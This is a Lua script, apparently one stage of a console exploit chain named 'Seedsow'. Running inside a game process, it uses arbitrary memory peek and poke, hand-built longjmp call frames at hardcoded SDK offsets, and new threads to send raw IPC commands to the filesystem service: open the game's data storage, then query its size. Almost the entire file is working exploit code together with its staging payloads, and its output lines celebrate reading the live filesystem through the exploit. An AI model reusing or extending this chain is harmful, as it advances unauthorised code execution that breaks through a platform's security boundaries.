-- Phase H: read real data over Seedsow. Thread 1 opens Civ7's data storage
-- (SetCurrentProcess + OpenDataStorageByCurrentProcess) and returns an IStorage
-- handle; main extracts it; thread 2 calls IStorage::GetSize(cmd 4) on it.
-- A plausible size = we are reading a live filesystem object through Seedsow.
--   nora_debug.py <host> phaseH_fsread_seedsow.lua --start 9 --max 9
local STOP = __STOP_AT__
local N = assert(_G.n2h, "n2h not initialized")
local LONGJMP,SVC_CREATE,SVC_START,SVC_WAIT,SVC_CLOSE,GET_PRIO = 0x5511B4,0x168B2C,0x168B44,0x168BF4,0x168BE4,0x168B5C
local GET_SERVICE,GET_TLS,MEMMOVE,SEND_SYNC = 0x14CC90,0x14BA80,0x522830,0x168C4C
local CUR_THREAD,STACK_BYTES,WAIT_NS,SFCO = 0xFFFF8000,0x14000,0x77359400,0x4f434653
local function hx(v) return string.format("0x%x", v) end
local function rd32(x) local a=x-x%8 local w=N.peek(a) if x%8==0 then return w%0x100000000 end return math.floor(w/0x100000000) end
local function sdkn(o) return N.sdk_base + o end

local function build_worker(base, calls)
  local STEP,RESULT,PAGE = 0x140,0x800,0x1000
  local LOADTABLE,CALL4,SAVERES64,EXIT,MM,LOADSELF = 0x4E094,0x359b88,0x19bcc0,0x168B4C,MEMMOVE,112
  local function sdk(o) return N.sdk_base+o end
  local function align(v) return math.ceil(v/PAGE)*PAGE end
  local expanded,patches = {},{}
  for _,call in ipairs(calls) do
    local loads = {}
    for i=1,4 do local a=call.args[i]
      if type(a)=="table" and a.dyn then loads[#loads+1]={argument=i-1,loadidx=#expanded}
        expanded[#expanded+1]={fn=MM,args={0,a.dyn,8,0}} end end
    local target=#expanded
    for _,l in ipairs(loads) do l.target=target; patches[#patches+1]=l end
    local s={} for i=1,4 do local a=call.args[i]; s[i]=(type(a)=="table") and 0 or a end
    expanded[#expanded+1]={fn=call.fn,args=s}
  end
  local count=#expanded
  local tables=align(RESULT+count*8); local stack=align(tables+count*0x100)+0x10000; local size=align(stack+count*STEP+0x4000)
  for _,p in ipairs(patches) do
    local slot
    if p.argument==0 then slot=(p.target==0) and 0x30 or (stack+(p.target-1)*STEP+0xe8)
    else slot=stack+p.target*STEP+({[1]=0x10,[2]=0x20,[3]=0x28})[p.argument] end
    expanded[p.loadidx+1].args[1]=base+slot
  end
  local function put(o,v) N.poke(base+o,v) end
  for o=0,0x200,8 do put(o,0) end
  for o=RESULT,RESULT+count*8,8 do put(o,0) end
  for o=tables,tables+count*0x100,8 do put(o,0) end
  for o=stack,stack+count*STEP+0x200,8 do put(o,0) end
  put(0x10,base+tables); put(0x30,expanded[1].args[1]); put(0x58,sdk(LOADTABLE)); put(0x68,base+stack)
  for idx=0,count-1 do
    local call=expanded[idx+1]; local tb,sp=tables+idx*0x100,stack+idx*STEP
    put(tb,base+tb+0x10); put(tb+0x10+LOADSELF,sdk(call.fn)); put(RESULT+idx*8,0)
    put(sp+8,sdk(CALL4)); put(sp+0x10,call.args[2]); put(sp+0x20,call.args[3]); put(sp+0x28,call.args[4])
    put(sp+0xd8,sdk(SAVERES64)); put(sp+0x118,base+RESULT+idx*8)
    if idx+1<count then put(sp+0x108,base+tables+(idx+1)*0x100); put(sp+0xe8,expanded[idx+2].args[1]); put(sp+0x128,sdk(LOADTABLE))
    else put(sp+0x128,sdk(EXIT)) end
  end
  return {res0=RESULT, count=count}
end

local S={}
local function pa(a) return a+0xFFF-(a+0xFFF)%0x1000 end
local function step(n,name,fn) if n>STOP then return end print(string.format("STEP %d OK %s %s",n,name,fn() or "")) end
-- precise 32-bit read
local function r32x(addr) local scr=S.scr; N.poke(scr,0); N.call_deep(sdkn(MEMMOVE),scr,addr,4,0,0); return N.peek(scr) end

-- run a worker frame to completion; returns the thread's TLS base
local function run_chain(frame, calls)
  build_worker(frame, calls)
  N.poke(S.ctrl,0)
  local cr=N.call_deep(sdkn(SVC_CREATE),S.ctrl,sdkn(LONGJMP),frame,S.stk+STACK_BYTES,S.prio,0)
  assert(cr==0,"create failed "..hx(cr)); local th=rd32(S.ctrl)
  assert(N.call_deep(sdkn(SVC_START),th,0,0,0,0)==0,"start failed")
  N.poke(S.ctrl+0x08,0); N.poke(S.ctrl+0x10,th)
  local jr=N.call_deep(sdkn(SVC_WAIT),S.ctrl+0x08,S.ctrl+0x10,1,WAIT_NS,0)
  N.call_deep(sdkn(SVC_CLOSE),th,0,0,0,0)
  assert(jr==0,"join failed "..hx(jr))
  return N.peek(frame+0x800)  -- res0 = thread TLS
end

step(1,"env",function() assert(N.sdk_base~=0) return "sdk="..hx(N.sdk_base) end)
step(2,"alloc",function()
  S.ctrl=pa(N.alloc(0x2000)); S.f1=pa(N.alloc(0x40000)); S.f2=pa(N.alloc(0x40000)); S.stk=pa(N.alloc(STACK_BYTES+0x1000))
  S.np=N.alloc(0x200); S.b1=pa(N.alloc(0x2000)); S.b2=pa(N.alloc(0x2000)); S.b3=pa(N.alloc(0x2000))
  S.scr=S.np-S.np%16+0x80; return "ok" end)
step(3,"get-fsp-handle",function()
  local b=S.np-S.np%16; N.write_bytes(b,"fsp-srv\0"); N.poke(b+0x40,0)
  local res=N.call_deep(sdkn(GET_SERVICE),b+0x40,b,7,0,0); S.handle=rd32(b+0x40)
  return "res="..hx(res).." handle="..hx(S.handle)..((res==0 and S.handle~=0) and " OK" or " FAILED") end)
step(4,"stage",function()
  for o=0,0xF8,8 do N.poke(S.b1+o,0); N.poke(S.b2+o,0); N.poke(S.b3+o,0) end
  N.write_bytes(S.b1,"\4\0\0\0".."\10\0\0\128".."\1\0\0\0"..string.rep("\0",8)   -- SetCurrentProcess
    ..string.rep("\0",12).."SFCI".."\0\0\0\0".."\1\0\0\0".."\0\0\0\0"..string.rep("\0",8))
  N.write_bytes(S.b2,"\4\0\0\0".."\8\0\0\0"..string.rep("\0",8).."SFCI".."\0\0\0\0".."\200\0\0\0".."\0\0\0\0") -- OpenDataStorage 200
  N.write_bytes(S.b3,"\4\0\0\0".."\8\0\0\0"..string.rep("\0",8).."SFCI".."\0\0\0\0".."\4\0\0\0".."\0\0\0\0")  -- IStorage::GetSize 4
  return "staged" end)
step(5,"borrow-prio",function()
  N.poke(S.ctrl,0); local r=N.call_deep(sdkn(GET_PRIO),S.ctrl+0x20,CUR_THREAD,0,0,0)
  local p=(r==0) and rd32(S.ctrl+0x20) or 0; if not(p>0 and p<64) then p=44 end; S.prio=p; return "prio="..p end)
step(6,"T1-open-storage",function()
  S.tls1 = run_chain(S.f1, {
    {fn=GET_TLS, args={0,0,0,0}},
    {fn=MEMMOVE, args={{dyn=S.f1+0x800}, S.b1, 0x100, 0}},
    {fn=SEND_SYNC, args={S.handle, 0,0,0}},
    {fn=MEMMOVE, args={{dyn=S.f1+0x800}, S.b2, 0x100, 0}},
    {fn=SEND_SYNC, args={S.handle, 0,0,0}},
  })
  return "T1 TLS="..hx(S.tls1) end)
step(7,"extract-IStorage-handle",function()
  -- OpenDataStorage reply: w1=0x80000008 (special hdr), move handle @ TLS+0xc
  local w1 = r32x(S.tls1+4)
  assert(w1 >= 0x80000000, "no handle descriptor in reply (w1="..hx(w1)..")")
  S.istorage = r32x(S.tls1+0xc)
  assert(S.istorage>0 and S.istorage<0xffff8000, "bad IStorage handle "..hx(S.istorage))
  return "IStorage handle="..hx(S.istorage) end)
step(8,"T2-GetSize",function()
  S.tls2 = run_chain(S.f2, {
    {fn=GET_TLS, args={0,0,0,0}},
    {fn=MEMMOVE, args={{dyn=S.f2+0x800}, S.b3, 0x100, 0}},
    {fn=SEND_SYNC, args={S.istorage, 0,0,0}},   -- send IStorage::GetSize to the IStorage handle
  })
  return "T2 TLS="..hx(S.tls2) end)
step(9,"read-size",function()
  N.call_deep(sdkn(SVC_CLOSE),S.istorage,0,0,0,0)
  N.call_deep(sdkn(SVC_CLOSE),S.handle,0,0,0,0)
  local pos=nil; for off=0,0x40,4 do if r32x(S.tls2+off)==SFCO then pos=S.tls2+off; break end end
  if not pos then return "no SFCO in GetSize reply" end
  local cmif=r32x(pos+8)
  local lo,hi=r32x(pos+16),r32x(pos+20)
  return "IStorage::GetSize cmif_result="..hx(cmif).." size=0x"..string.format("%x",hi)..string.format("%08x",lo)..
    ((cmif==0 and lo+hi>0) and "  *** READ LIVE FS SIZE OVER SEEDSOW ***" or "") end)
print("phaseH bound="..STOP.." reached end")
